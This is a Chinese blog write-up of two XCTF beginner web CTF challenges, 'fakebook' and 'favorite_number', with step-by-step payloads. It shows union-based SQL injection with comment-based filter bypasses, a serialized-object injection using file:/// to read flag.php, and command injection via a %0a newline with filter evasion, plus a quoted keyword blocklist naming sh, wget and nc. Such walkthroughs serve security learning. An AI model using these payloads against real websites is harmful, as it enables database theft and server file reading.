# 原创
：  【攻防世界WEB】难度三星9分入门题（终）：fakebook、favorite_number

# 【攻防世界WEB】难度三星9分入门题（终）：fakebook、favorite_number

**目录**

[七、fakebook](#%E5%9B%9B%E3%80%81easytornado)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

[八、favorite_number](#%E5%9B%9B%E3%80%81easytornado)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

---


## 七、fakebook

> 

 


<h3>解题方法：</h3>
1、寻找注入点，发现反序列化函数，与序列化内容，猜测文件位置


> 
<h3>过程：</h3>
查看robots.txt文件
发现是一个备份文件

<hr/>
正则匹配：在blog中要匹配到https://

<hr/>
现在再去注册

这个1可以点
<img alt="" height="370" src="https://img-blog.csdnimg.cn/976f3aa4e2d84541afb8c470943b066b.png" width="1107"/> 发现进行了传参

<hr/>
考虑是否有：
注入
文件包含
伪协议
…… 
<hr/>
 输入单引号报错 
但是无法闭合

换一种方法尝试
加上and 1=1
（回显正常）

 输入and 1=2
（报错）<img alt="" height="661" src="https://img-blog.csdnimg.cn/03df00c191fe4a7cbc81853092bec0ab.png" width="1200"/>
 存在注入点
<hr/>
查字段数
order by 4
（回显正常）

 order by 5
（报错）

所以有4个字段
<hr/>判断回显点 
 
 尝试绕过
/**/union/**/ select /**/1,2,3,4

 发现2是回显点
<hr/>
爆数据库
/**/union/**/ select/**/ 1,database(),3,4
 数据库为fakebook<img alt="" height="415" src="https://img-blog.csdnimg.cn/0a6cc85e26f3432dac56dc8f4c57bedd.png" width="1090"/>
 
<hr/>
 爆表
-1 /**/union /**/ select/**/ 1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema=database()#
获得了users表

<hr/>
爆字段
 -1 /**/union /**/ select/**/ 1,group_concat(column_name) ,3,4 from information_schema.columns where table_schema="fakebook"#

<hr/>
爆数据
-1 /**/union /**/ select/**/ 1,group_concat(no,'~',data) ,3,4 from fakebook.users#
 没啥有用信息
突然关注到反序列化函数，与这个出现了多次的路径<img alt="" height="406" src="https://img-blog.csdnimg.cn/aeef3900eb054d98a02e2828fc7b556f.png" width="1091"/>
 
<hr/>
文件路径
/var/www/html/view.php
那么flag的路径也可能是
/var/www/html/flag.php

因为存在反序列化函数，所以我们应该注入序列化语句
<hr/>
使用file:///协议去访问本地计算机文件
-1 /**/union /**/ select /**/1,2 ,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
 <img alt="" height="568" src="https://img-blog.csdnimg.cn/fa4b5353275b4159b344f384bb2f3433.png" width="1105"/>
但是没有显示出flag.php内容
很多flag都不显示，而在源码内，Ctrl+U查看源码 
发现一段base64加密字符

PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg==
解密后为

flag{c1e552fdf77049fabf65168f22f7aeab}


---


---


---


---


---


---


---


---


## 八、favorite_number

> 

 
<h3>解题方法：</h3>
1、源码分析，绕过过滤，flag寻找方法


> 
<h3>过程：</h3>
进入后就是php代码

代码1：数组
使用$_POST["stuff"]接收数组
并且限制$stuff[0] != 'admin'
可以采用数组下标溢出绕过
stuff[2^32]=admin
<pre><code>$stuff = $_POST["stuff"];
$array = ['admin', 'user'];
if($stuff === $array &amp;&amp; $stuff[0] != 'admin') { 
    $num= $_POST["num"]; </code></pre>
<hr/>
代码2：正则匹配
"/^\d+$/im"：匹配一串数字，不能有其它字符
/m：多行匹配，有一行匹配成功，preg_match返回true
换行符：0x0a（ascii码），%0a（URL编码）
<pre>` if (preg_match("/^\d+$/im",$num)){ `</pre>
<hr/>
代码3：过滤关键字
<pre>` if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){ `</pre>
<hr/>
1、数组：数字下标溢出绕过
2、正则匹配：%0a多行绕过
3、关键字过滤：可以拼接其他命令&amp;&amp;（ascii码0x26，URL编码%26）
构造payload：
stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0als<br/>  

<hr/>
使用bp抓包

 发现通过HackBar提交的内容被编码了

 
<hr/>
使用bp把它再改回原来的payload
然后再发送

 
<hr/>
开始寻找flag
先寻找flag的inode的索引点
payload：
stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0als -i /
再通过HackBar提交，再改包<br/><img alt="" height="335" src="https://img-blog.csdnimg.cn/e37061458e814cc5a52d5f5faacb4421.png" width="959"/>
 18497049 flag<img alt="" height="788" src="https://img-blog.csdnimg.cn/1855215576e14a0c8f0b9f82db0e7736.png" width="1200"/>
<hr/>
读取flag
payload：
stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0atac `find / -inum 18497049`
再通过HackBar提交，再改包

 超时了<img alt="" height="550" src="https://img-blog.csdnimg.cn/39d8e0e7e9284678bd2ed9da17004fa3.png" width="1200"/>
<hr/>
换一种方法
因为没过滤$，用变量拼接试试
payload：
stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=1%0aa=f;b=lag;tac /$a$b;

 cyberpeace{7d870124ba11eacef73c2c409588eadf}



---


---


---


---

